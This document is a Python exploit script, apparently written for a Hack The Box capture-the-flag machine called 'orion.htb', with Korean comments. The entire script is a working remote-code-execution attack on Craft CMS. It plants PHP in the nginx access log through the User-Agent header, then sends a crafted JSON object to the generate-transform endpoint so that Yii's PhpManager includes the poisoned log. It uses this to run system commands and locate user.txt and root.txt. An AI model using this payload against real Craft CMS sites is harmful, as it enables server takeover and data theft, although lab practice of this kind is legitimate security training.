#!/usr/bin/env python3
import socket, sys, re, json, time, base64
import requests, urllib3

urllib3.disable_warnings()
TARGET_IP = "10.129.244.146"
_orig = socket.getaddrinfo
def p(h, *a, **kw):
    return _orig(TARGET_IP if h == "orion.htb" else h, *a, **kw)
socket.getaddrinfo = p

TARGET = "http://orion.htb"
s = requests.Session()
s.verify = False

def run_cmd(cmd, marker_s="[S]", marker_e="[E]"):
    csrf_r = s.get(f"{TARGET}/actions/users/session-info", headers={"Accept": "application/json"})
    csrf = csrf_r.json()["csrfTokenValue"]

    # 마커와 함께 명령 실행
    php = f"<?php echo '{marker_s}'; system('{cmd}'); echo '{marker_e}'; exit; ?>"
    s.get(f"{TARGET}/", headers={"User-Agent": php})
    time.sleep(0.2)

    payload = {
        "assetId": 2,
        "handle": {"width": 1, "height": 1,
            "as hack": {
                "class": "craft\\behaviors\\FieldLayoutBehavior",
                "__class": "yii\\rbac\\PhpManager",
                "__construct()": [{"itemFile": "/var/log/nginx/access.log"}],
            },
        },
    }
    r = s.post(f"{TARGET}/actions/assets/generate-transform",
               data=json.dumps(payload),
               headers={"Content-Type": "application/json", "X-CSRF-Token": csrf})

    # 마커 사이의 내용 추출
    m = re.search(re.escape(marker_s) + r"(.*?)" + re.escape(marker_e), r.text, re.DOTALL)
    return m.group(1).strip() if m else f"(no match in {len(r.text)} bytes)"

# 핵심 명령들
cmds = [
    ("cat /etc/hostname", "hostname"),
    ("whoami", "user"),
    ("pwd", "pwd"),
    ("find /home -type f -name user.txt 2>/dev/null", "user.txt"),
    ("find / -name 'FLAG*' -o -name 'flag*' -type f 2>/dev/null | head -10", "flags"),
    ("ls -la /home 2>/dev/null", "ls /home"),
    ("cat /root/root.txt 2>/dev/null || echo 'permission denied'", "root.txt"),
]

for cmd, label in cmds:
    print(f"\n[*] {label}:")
    out = run_cmd(cmd, "[S]", "[E]")
    print(out[:800] if len(out) < 1000 else out[:800] + "...")
